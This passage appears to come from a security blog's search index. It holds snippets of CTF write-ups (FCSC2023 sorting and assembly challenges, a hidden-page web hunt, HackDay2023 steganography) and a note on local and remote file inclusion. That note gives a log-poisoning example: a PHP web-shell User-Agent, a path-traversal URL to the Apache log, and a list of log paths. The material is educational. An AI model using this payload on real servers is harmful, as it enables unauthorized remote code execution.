io.recvline().strip().decode()\tif \"flag\" in r:\t\tprint(r)\telse:\t\tprint(io.recvline().strip().decode())\t\tprint(io.recvline().strip().decode())def trier(N):\t#############################\t# ... Complétez ici ... #\t# Ajoutez votre code Python #\t#############################\tif comparer(0, 1):\t\techanger(0, 1)\tpass# Ouvre la connexion au serveurio = remote(HOST, PORT)# Récupère la longueur du tableauN = longueur()# Appel de la fonction de tri que vous devez écriretrier(N)# Verificationverifier()# Fermeture de la connexionio.close()We have to implement the “trier” function. The challenge is pretty easy, we can implement the most basic sort algorithm like this:def trier(N):\t#############################\t# ... Complétez ici ... #\t# Ajoutez votre code Python #\t#############################\ti = 0\twhile i &lt; N - 1:\t\tj = i + 1\t\twhile j &lt; N:\t\t\tif not comparer(i, j):\t\t\t\techanger(i, j)\t\t\tj += 1\t\ti += 1Then we run the client:python client_sol.pyWe have the flag, nice!" }, { "title": "CTFs | FCSC2023 | Intro | T'es lent", "url": "/CTFs/FCSC2023/intro/tes_lent", "categories": "CTFs, FCSC2023, Intro", "tags": "CTFs, FCSC2023, Intro, Web", "date": "2023-04-30 00:00:00 +0200", "snippet": "ContextHere is the website:By following the “plus d’info” button, we end up here:By following “Postuler”, we end up with nothing:There’s nothing in the source of the offer or on this page.In the source of the main page, there is this:By going to “/stage-generateur-de-nom-de-challenges.html”, we find another job offer:We still cannot apply for the job :smiling_face_with_tear:.Looking at the source code of the second offer, we find this:On this page, there is the flag 🥳 !!" }, { "title": "CTFs | FCSC2023 | Intro | Comparaison", "url": "/CTFs/FCSC2023/intro/comparaison", "categories": "CTFs, FCSC2023, Intro", "tags": "CTFs, FCSC2023, Intro, Hardware", "date": "2023-04-30 00:00:00 +0200", "snippet": "ContextWe are given: the code of the machine (machine.py) a code to translate the assembly code into hex format in order to send it to the server (assembly.py) the code present on the server (challenge.py)This challenge is an introduction to assembly code.The harder was to understand the syntax of the asm code they created.Here is the python code I created:from assembly import assembly# create the assembly codecode = \"\"\"CMP R5, R6JNZA differentMOV R0, #0x0JA enddifferent: MOV R0, #0x1end: MOV R0, R0 // instruction inutile pour éviter un \"warning\"STP\"\"\"# create the assembly objectasm = assembly(code.split(\"\\n\"))print(asm)R5 and R6 contains the 2 values that we have to compare.We compare the two values.If they are equal, we set the value of R0 to 0 and jump to the end.If they are different, we jump to the label “different” and set the value of R0 to 1.Let’s look at the output:It seems that our code has been translated to hex without problem.Let’s send it to the server:One more flag 🙂!" }, { "title": "CTFs | FCSC2023 | Hardware | Fibonacci", "url": "/CTFs/FCSC2023/hardware/fibonacci", "categories": "CTFs, FCSC2023, Hardware", "tags": "CTFs, FCSC2023, Hardware", "date": "2023-04-30 00:00:00 +0200", "snippet": "ContextThis chall is an introduction to assembly code. Assembly code is important to know in reverse engineering or pwn challenges.This challenge uses the same machine as this one : FCSC 2023: Comparaison.We are given: the code of the machine (machine.py) a code to translate the assembly code into hex format in order to send it to the server (assembly.py) the code present on the server (challenge.py)In this challenge, we have to compute the fibonacci sequence.Here is the python code I created:from assembly import assemblycode = \"\"\"; Initialize variablesMOV R3, #0MOV R4, #1MOV R0, #0 ; first number in sequenceMOV R1, #1 ; second number in sequenceloop: CMP R5, R3 JZA done SUB R5, R5, R4 ADD R2, R0, R1 MOV R0, R1 MOV R1, R2 JA loop done:STP\"\"\"code = code.split(\"\\n\")print(assembly(code))R5 contains the number of the fibonacci sequence we want to compute.R0 and R1 contains the first two numbers of the sequence (0 and 1).R2 is used to store the sum of the two numbers.We compare R5 and R3 (which is 0) and jump to the label “done” if they are equal.If they are different, we subtract R4 (which is 1) from R5 and jump to the label “loop”.In the loop, we add R0 and R1 and store the result in R2.Then, we move the value of R1 to R0 and the value of R2 to R1.Finally, we jump to the label “loop”.Let’s send it to the server:We get the flag 🎉 !" }, { "title": "Notes | Web | File Inclusion", "url": "/Notes/Web/lfi", "categories": "Notes, File Inclusion", "tags": "Notes, Web, File Inclusion", "date": "2023-04-23 00:00:00 +0200", "snippet": "LFI / RFIFile inclusion occurs when the user can control the file that will be loaded by the server.LFI (Local File Inclusion) -&gt; The server loads a local file.RFI (Remote File Inclusion) -&gt; The server loads a file located on a remote server.Log PoisoningHow does this work?Let’s imagine that the website is using PHP and you can control the file that is being loaded (LFI). You want to be able to execute php code to gain RCE.You replace your User-Agent by a malicious PHP code. So, when you display the log file, your User-Agent will appear and the code will be executed.Example:User-Agent:&lt;?php system($_GET['cmd']); ?&gt;Url :http://site.com/test.php?view=../../../../../var/log/apache2/access.log?cmd=lsHere the output of the “ls” command is display on the screen.Possible log files:/var/log/apache2/access.log/var/log/apache/access.log/var/log/apache2/error.log/var/log/apache/error.log/usr/local/apache/log/error_log/usr/local/apache2/log/error_log/var/log/nginx/access.log/var/log/nginx/error.log/var/log/httpd/error_logLFI lists for fuzzing: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFITools: https://github.com/takabaya-shi/LFI2RCE" }, { "title": "CTFs | HackDay2023 | Forensic | Assassins Communication", "url": "/CTFs/Hackday2023/forensic/assassins_communication", "categories": "CTFs, HackDay2023, Forensic", "tags": "CTFs, HackDay2023, Forensic, Steganography", "date": "2023-04-11 00:00:00 +0200", "snippet": "ContextWe have got a wireshark capture named leak.pcapngI used binwalk on the capture to see if it contains something:Here is what we have got:The flag.txt file is empty and the zip file is password protectedSo i decided to crack it !Well… I’ve got nothing.Let’s take a look at the wireshark capture.Looking at the HTTP conversation, I see that there is an image in the conversation that is in plain text.I saved it (put the data in raw first)And I opened itLet’s try to run steghide on this image.It’s password protected. Let’s try to brute force it with stegseek:We’ve got the zip password ! (aBqw7FB0f3VqTZrW)Let’s open the zip file.We’ve got the flag, well done !!" } ]
